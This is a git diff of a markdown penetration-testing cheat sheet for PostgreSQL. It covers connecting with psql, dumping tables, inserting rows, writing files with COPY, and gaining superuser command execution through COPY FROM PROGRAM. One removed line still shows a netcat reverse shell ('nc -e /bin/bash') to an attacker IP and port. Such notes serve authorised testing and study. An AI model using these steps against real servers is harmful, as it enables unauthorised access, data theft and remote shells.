@@ -1,13 +1,17 @@
 ---
 title: "Postgresql"
-date: 2024-7-9
+date: 2025-3-2
 tags: ["Database Dumping", "Privilege Escalation In Databases", "Postgresql", "RCE", "Database"]
 ---
 
 ### Connect
 
 ```console
-psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME>
+psql -h <TARGET> -U <USER>
+```
+
+```console
+psql -h <TARGET> -U <USER> -p <PORT> -d <DB_NAME>
 ```
 
 ```console
@@ -17,33 +21,38 @@ psql 'postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>'
 ### Basic
 
 ```console
-# Show databases
+# Show Databases
 \list
 ```
 
 ```console
-# Use database
+# Use Database
 \connect <DB_NAME>
 ```
 
 ```console
-# Show tables in current database
+# Show Tables
 \dt
 ```
 
 ```console
-# Dump data from table
+# Dump from Table
 select * from "<TABLE_NAME>";
 ```
 
 ```console
-# Insert data into table (e.g)
-insert into "<TABLE_NAME>" (username, password, role) values ('user', 'password', 'admin');
+# Insert into Table
+insert into "<TABLE_NAME>" (<COLUMN_1>, <COLUMN_2>) values ("<VALUE_1>', '<VALUE_2>');
 ```
 
 ```console
-# Write text
-copy (select '<STRING>') to '/var/lib/postgresql/.profile';
+# Write Text
+copy (select '<STRING>') to '<TARGET_PATH>';
+```
+
+```console
+# List All User Accounts
+\du+
 ```
 
 ```console
@@ -51,11 +60,23 @@ copy (select '<STRING>') to '/var/lib/postgresql/.profile';
 \q
 ```
 
+<br>
+
 ---
 
 ### RCE
 
 ```console
-# Only superuser
-CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash <LOCAL_IP> <LOCAL_PORT> &'
+# Only for Superuser
+CREATE TABLE IF NOT EXISTS exec(string text);
+```
+
+```console
+# Code Execution
+COPY exec FROM PROGRAM '<CMD>';
+```
+
+```console
+# Check Ouput
+SELECT * FROM exec;
 ```
